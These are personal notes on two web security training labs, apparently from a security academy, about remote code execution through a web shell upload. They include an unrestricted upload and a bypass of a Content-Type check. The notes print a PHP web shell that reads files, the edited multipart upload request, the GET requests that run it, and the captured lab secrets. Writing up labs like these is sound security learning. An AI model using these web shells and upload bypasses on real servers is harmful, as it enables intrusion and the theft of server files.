# Lab: Remote code execution via web shell upload

* On using the provided upload feautre, I noticed that it permitted all extensions.
* The uploaded image uses the request `GET /files/avatars/83b78b419aa8c12b269f770b8be4a350%20(1).jpg HTTP/2`
* I then created this php script: `<?php echo file_get_contents('/home/carlos/secret'); ?>` and uploaded it to the server as `exploit.php`
* On modifying the previous image request to use the path `GET /files/avatars/exploit.php HTTP/1.1`, I get the required secret as: `lZTF0H3TwLU7yXCWD4vXqRMmeGxnQOHm`

***

# Lab: Web shell upload via Content-Type restriction bypass

I tried following the same method as the previous lab again but was met with this error: 
`Sorry, file type application/octet-stream is not allowed Only image/jpeg and image/png are allowed Sorry, there was an error uploading your file.`

* On taking a took at the POST request I can see that:

```
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/octet-stream

<?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundaryntUg6yv66ijlIh6S
Content-Disposition: form-data; name="user" 
```

I tried changing content-type to `image/jpg` but that didn't work either so I uploaded an actual image and compared the POST requests, only to realize I was supposed to spell it as `jpeg` instead.

* After uploading the script I changed the GET request for the original image to `GET /files/avatars/exploit.php HTTP/2` to get the password as `zEMcU1zeJrVg9AvfOarZngy6BcsGKVfT`.

***

# Concepts Learned
* This script enables you to pass an arbitrary system command via a query parameter as follows:
 `GET /example/exploit.php?command=id HTTP/1.1`
* To read arbitrary files from the server's filesystem:
  `<?php echo file_get_contents('/path/to/target/file'); ?>`
* MIME type tells the server what kind of data is being sent with the format `type/subtype`. 

